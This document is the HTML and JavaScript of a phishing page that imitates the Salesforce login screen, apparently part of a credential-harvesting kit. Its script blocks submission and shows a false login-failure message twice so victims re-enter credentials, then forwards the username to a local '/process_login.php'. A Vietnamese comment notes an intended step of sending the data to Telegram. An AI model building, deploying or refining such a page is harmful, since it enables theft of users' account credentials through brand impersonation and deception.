
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="styles/login.css" />
        <link rel="stylesheet" href="styles/bootstrap.min.css" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
        <title>Document</title>
    </head>
    <body>
        <div class="table-container">
            <div class="left">
                <div id="main">
                    <div id="wrapper">
                        <div
                            id="logo_wrapper"
                            class="standard_logo_wrapper mb24"
                        >
                            <div
                                style="
                                    height: 100%;
                                    display: table-cell;
                                    vertical-align: bottom;
                                "
                            >
                                <img
                                    aria-hidden="true"
                                    id="logo"
                                    class="standard_logo"
                                    src="img/logo214.svg"
                                    alt="Salesforce"
                                    border="0"
                                    name="logo"
                                />
                                <span class="zen-assistiveText"
                                    >Salesforce</span
                                >
                            </div>
                        </div>
                        <div id="content" style="display: block">
                            <p id="msg" style="margin: 0px;display: none"></p>
                            <div id="theloginform" style="display: block">
                                <form
                                    name="login"
                                    method="get"
                                    id="login_form"
                                    target="_top"
                                    autocomplete="off"
                                >
                                    <div id="usernamegroup" class="inputgroup">
                                        <label
                                            for="username"
                                            class="label usernamelabel"
                                            >Username</label
                                        >
                                        <div id="username_container">
                                            <input
                                            required
                                                class="input r4 wide mb16 mt8 username"
                                                type="email"
                                                value=""
                                                name="username"
                                                id="username"
                                                aria-describedby="error"
                                                style="display: block"
                                            />
                                        </div>
                                    </div>
                                    <label for="password" class="label"
                                        >Password</label
                                    ><input
                                    required
                                        class="input r4 wide mb16 mt8 password"
                                        type="password"
                                        id="password"
                                        name="pw"
                                        aria-describedby="error"
                                        aria-required="true"
                                        onkeypress="checkCaps(event)"
                                        autocomplete="off"
                                    />
                                    
                                    <input
                                        class="button r4 wide primary"
                                        type="submit"
                                        id="Login"
                                        name="Login"
                                        value="Log In"
                                    />
                                    <div class="w0 pr ln3 p16 remember">
                                        <input
                                            type="checkbox"
                                            class="r4 fl mr8"
                                            style=""
                                            id="rememberUn"
                                            name="rememberUn"
                                        /><label
                                            for="rememberUn"
                                            class="fl pr db tn3"
                                            >Remember me</label
                                        ><br />
                                    </div>
                                </form>
                                <div class="w0 links bt pt16 mb20">
                                    <a
                                        id="forgot_password_link"
                                        class="fl small"
                                        href="https://login.salesforce.com/secur/forgotpassword.jsp"
                                        >Forgot Your Password?</a
                                    >
                                    
                                </div>
                            </div>
                            
                        </div>
                        <div id="signup" class="tc mt24" style="display: block">
                            <p class="di mr16">Not a customer?</p>
                            <a
                                class="button secondary"
                                id="signup_link"
                                href="https://www.salesforce.com/form/trial/freetrial.jsp?d=70130000000Enus"
                                >Try for Free</a
                            >
                        </div>
                    </div>
                </div>
                <footer>
                    © 2024 Salesforce, Inc. All rights reserved. | Privacy
                </footer>
            </div>
            <div class="right">
                <div class="curve-container">
                    <h3 style="padding-top: 50px">
                        <b>
                            Start your free trial. No credit card required, no
                            software to install.
                        </b>
                    </h3>
                    <p>With your trial, you get:</p>

                    <p>
                        <img src="img/green-checkmark.png" /> Preloaded data or
                        upload your own
                    </p>

                    <p>
                        <img src="img/green-checkmark.png" /> Preconfigured
                        processes, reports, and dashboards
                    </p>

                    <p>
                        <img src="img/green-checkmark.png" />
                        Guided experiences for sales reps, leaders, and
                        administrators
                    </p>

                    <p>
                        <img src="img/green-checkmark.png" /> Online training
                        and live onboarding webinars
                    </p>
                    <div class="btn-container">
                        <a
                            style="background-color: #0b5cab;color: #fff;"
                            class="btn salesforce-sans-regular"
                            data-content-replacement-close-color="sfdc-swap-button-day"
                            href="https://www.salesforce.com/form/signup/freetrial-elf-v2/?d=cta-li-promo-147"
                            target="_blank"
                        >
                            <span> Start my free trial </span>
                        </a>
                    </div>
                    <img style="padding-left: 50px;padding-right: 50px;" width="100%" src="img/php-login-free-trial-fg-2.png"/>
                </div>
            </div>
        </div>
        <script>
            var cnt=0;
            document.getElementById('password').addEventListener('input', function (event) {
                jQuery('#msg').hide().html('');
            });

            document.getElementById('login_form').addEventListener('submit', function (event) {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;

                event.preventDefault(); // Ngăn form submit
                if (cnt<2) {
                    cnt++;
                    jQuery('#msg').html('Please check your username and password. If you still can\'t log in, contact your Salesforce administrator.').show();
                    return;
                }

                //gọi api để bắn về telegram
                

                window.location.href = '/process_login.php?username=' + username;
                
            });
        </script>

    </body>
</html>